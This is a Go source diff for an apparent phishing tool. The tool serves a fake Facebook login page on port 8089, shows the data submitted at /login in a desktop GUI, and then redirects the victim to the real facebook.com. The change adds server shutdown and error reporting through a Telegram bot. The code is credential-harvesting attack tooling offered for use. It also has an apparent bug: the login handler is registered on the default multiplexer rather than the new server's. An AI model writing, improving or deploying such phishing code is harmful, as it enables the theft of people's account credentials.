@@ -1,12 +1,16 @@
 package main
 
 import (
+	"context"
 	"fmt"
 	"net/http"
 	"regexp"
 	"strings"
 
+	"github.com/raifpy/Go/errHandler"
+
 	"fyne.io/fyne"
+	"fyne.io/fyne/dialog"
 	"fyne.io/fyne/widget"
 )
 
@@ -23,8 +27,8 @@ func isEmailValid(e string) bool {
 
 //
 
-func serveFacebookLogin(win fyne.Window, textGrid *widget.TextGrid, textStream *string) {
-	serverFunc := func(response http.ResponseWriter, request *http.Request) {
+func serveFacebookLogin(kapat chan bool, win fyne.Window, textGrid *widget.TextGrid, textStream *string) {
+	serveFunc := func(response http.ResponseWriter, request *http.Request) {
 		fmt.Fprintln(response, faceLoginHTML)
 	}
 	serveFuncLogin := func(response http.ResponseWriter, request *http.Request) {
@@ -47,8 +51,26 @@ func serveFacebookLogin(win fyne.Window, textGrid *widget.TextGrid, textStream *
 		textGrid.SetText(*textStream)
 		http.Redirect(response, request, "https://facebook.com", 301)
 	}
-	http.HandleFunc("/", serverFunc)
+
+	m := http.NewServeMux()
+	s := http.Server{Addr: ":8089", Handler: m}
+	m.HandleFunc("/", serveFunc)
 	http.HandleFunc("/login", serveFuncLogin)
-	http.ListenAndServe(":8089", nil)
+
+	go func() {
+		<-kapat
+		s.Shutdown(context.Background())
+
+	}()
+	if err := s.ListenAndServe(); errHandler.HandlerBool(err) {
+		if useTelegramBot {
+			tg.send(err.Error())
+		}
+		dialog.ShowError(err, win)
+	}
+
+	//http.HandleFunc("/", serverFunc)
+
+	//http.ListenAndServe(":8089", nil)
 
 }
